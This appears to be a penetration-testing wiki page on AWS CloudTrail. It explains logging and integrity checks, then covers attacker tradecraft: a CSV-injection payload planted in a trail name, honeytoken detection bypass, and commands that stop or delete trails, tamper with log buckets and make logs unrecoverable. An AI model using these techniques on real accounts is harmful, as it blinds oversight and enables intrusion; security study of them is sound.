## **CloudTrail**

This service **tracks and monitors AWS API calls made within the environment**. Each call to an API (event) is logged. Each logged event contains:

* The name of the called API: `eventName`
* The called service: `eventSource`
* The time: `eventTime`
* The IP address: `SourceIPAddress`
* The agent method: `userAgent`. Examples:
  * Signing.amazonaws.com - From AWS Management Console
  * console.amazonaws.com - Root user of the account
  * lambda.amazonaws.com - AWS Lambda
* The request parameters: `requestParameters`
* The response elements: `responseElements`

Event's are written to a new log file **approximately each 5 minutes in a JSON file**, they are held by CloudTrail and finally, log files are **delivered to S3 approximately 15mins after**.\
CloudTrails logs can be **aggregated across accounts and across regions.**\
CloudTrail allows to use **log file integrity in order to be able to verify that your log files have remained unchanged** since CloudTrail delivered them to you. It creates a SHA-256 hash of the logs inside a digest file. A sha-256 hash of the new logs is created every hour.\
When creating a Trail the event selectors will allow you to indicate the trail to log: Management, data or insights events.

Logs are saved in an S3 bucket. By default Server Side Encryption is used (SSE-S3) so AWS will decrypt the content for the people that has access to it, but for additional security you can use SSE with KMS and your own keys.

### Log File Naming Convention

![](<../../../../.gitbook/assets/image (29).png>)

### S3 folder structure

![](<../../../../.gitbook/assets/image (47).png>)

Note that the folders "_AWSLogs_" and "_CloudTrail_" are fixed folder names,

**Digest** files have a similar folders path:

![](<../../../../.gitbook/assets/image (22).png>)

### Aggregate Logs from Multiple Accounts

* Create a Trial in the AWS account where you want the log files to be delivered to
* Apply permissions to the destination S3 bucket allowing cross-account access for CloudTrail and allow each AWS account that needs access
* Create a new Trail in the other AWS accounts and select to use the created bucket in step 1

However, even if you can save al the logs in the same S3 bucket, you cannot aggregate CloudTrail logs from multiple accounts into a CloudWatch Logs belonging to a single AWS account

### Cloudtrail from all org accounts into 1

When creating a CloudTrail, it's possible to indicate to get activate cloudtrail for all the accounts in the org and get the logs into just 1 bucket:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

This way you can easily configure CloudTrail in all the regions of all the accounts and centralize the logs in 1 account (that you should protect).

### Log Files Checking

You can check that the logs haven't been altered by running

```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```

### Logs to CloudWatch

**CloudTrail can automatically send logs to CloudWatch so you can set alerts that warns you when suspicious activities are performed.**\
Note that in order to allow CloudTrail to send the logs to CloudWatch a **role** needs to be created that allows that action. If possible, it's recommended to use AWS default role to perform these actions. This role will allow CloudTrail to:

* CreateLogStream: This allows to create a CloudWatch Logs log streams
* PutLogEvents: Deliver CloudTrail logs to CloudWatch Logs log stream

### Event History

CloudTrail Event History allows you to inspect in a table the logs that have been recorded:

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** automatically **analyzes** write management events from CloudTrail trails and **alerts** you to **unusual activity**. For example, if there is an increase in `TerminateInstance` events that differs from established baselines, you‚Äôll see it as an Insight event. These events make **finding and responding to unusual API activity easier** than ever.

### Security

| CloudTrail Log File Integrity        | <ul><li>Validate if logs have been tampered with (modified or deleted)</li><li><p>Uses digest files (create hash for each file)</p><ul><li>SHA-256 hashing</li><li>SHA-256 with RSA for digital signing</li><li>private key owned by Amazon</li></ul></li><li>Takes 1 hour to create a digest file (done on the hour every hour)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>Use IAM policies and S3 bucket policies</p><ul><li>security team ‚Äî> admin access</li><li>auditors ‚Äî> read only access</li></ul></li><li>Use SSE-S3/SSE-KMS to encrypt the logs</li></ul>                                                                                                                                        |

## Actions

### Enumeration

```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```

### **CSV Injection**

It's possible to perform a CVS injection inside CloudTrail that will execute arbitrary code if the logs are exported in CSV and open with Excel.\
The following code will generate log entry with a bad Trail name containing the payload:

```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
	Name=payload,
	S3BucketName="random"
)
print(response)
```

## **Avoid Detection**

### HoneyTokens **bypass**

Honeyokens \*\*\*\* are created to **detect exfiltration of sensitive information**. In case of AWS, they are **AWS keys whose use is monitored**, if something triggers an action with that key, then someone must have stolen that key.

However, this monitorization is performed via **CloudTrail**, and there are some A**WS services that doesn't send logs to CloudTrail** (fin the [list here](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Some of those services will **respond** with an **error** containing the **ARN of the key role** if someone unauthorised (the honeytoken key) try to access it.

This way, an **attacker can obtain the ARN of the key without triggering any log**. In the ARN the attacker can see the **AWS account ID and the name**, it's easy to know the Honeytoken's companies accounts ID and names, so this way an attacker can identify id the token is a honeytoken.

![](<../../../../.gitbook/assets/image (65).png>)

\*\*\*\*[**This script**](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html) or [**Pacu**](https://github.com/RhinoSecurityLabs/pacu) detects if a key belongs to **Canarytokens** or **SpaceCrab**.

{% hint style="danger" %}
The API used in Pacu and the script **is now caught**, so you need to **find a new one**.\
To find a new one you could generate a canary token in [https://canarytokens.org/generate](https://canarytokens.org/generate)
{% endhint %}

For more information check the [**original research**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Delete trails

```
aws cloudtrail delete-trail --name [trail-name]
```

### Stop trails

```
aws cloudtrail stop-logging --name [trail-name]
```

### Disable multi-region logging

```
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```

### Bucket Modification

* Delete the S3 bucket
* Change bucket policy to deny any writes from the CloudTrail service
* Add lifecycle policy to S3 bucket to delete objects
* Disable the kms key used to encrypt the CloudTrail logs

### Cloudtrail "ransomware"

You could **generate an asymmetric key** and make **CloudTrail encrypt the data** with that key and **delete the private key** so the cloudtrail contents cannot be recovered cannot be recovered.
